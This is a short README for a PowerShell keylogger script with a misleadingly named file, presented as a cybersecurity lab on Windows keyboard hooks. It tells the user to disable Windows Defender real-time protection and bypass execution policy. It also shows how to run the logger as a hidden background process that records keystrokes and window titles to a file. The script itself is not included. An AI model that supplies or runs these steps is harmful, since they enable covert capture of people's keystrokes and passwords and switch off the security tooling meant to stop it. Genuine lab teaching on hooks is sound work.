# ⌨️ Win11 Keyboard Hook Lab

PowerShell script (`RevisionServidoresSs.ps1`) for cybersecurity academy labs to analyze low-level Windows APIs (`SetWindowsHookEx`).

## 1. Disable Windows Defender (Run as Admin)
AMSI will block this script in memory. Run this command in an **Administrator** terminal to allow the lab test:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
2. Run the Script
Option A: Standard Mode (Visible Console)
See window changes and keystrokes printed in real-time while saving to the log:
```powershell
powershell -ExecutionPolicy Bypass -File .\RevisionServidoresSs.ps1 -ShowInConsole -LogPath .\key.log
```
Hidden Mode (Background)
Run the script invisibly without opening any windows on the desktop:
```powershell
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File .\RevisionServidoresSs.ps1 -LogPath .\key.log" -WindowStyle Hidden
```
3. Monitor the Log
```powershell
Get-Content -Path .\key.log -Wait -Tail 10
```
4. Check Background Processes
```powershell
Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" | Select-Object ProcessId, CommandLine
```
5. Stop Lab & Restore Security (Run as Admin)
```powershell
# Stop background processes
Stop-Process -Name powershell

# Enable Windows Defender back
Set-MpPreference -DisableRealtimeMonitoring $false
```
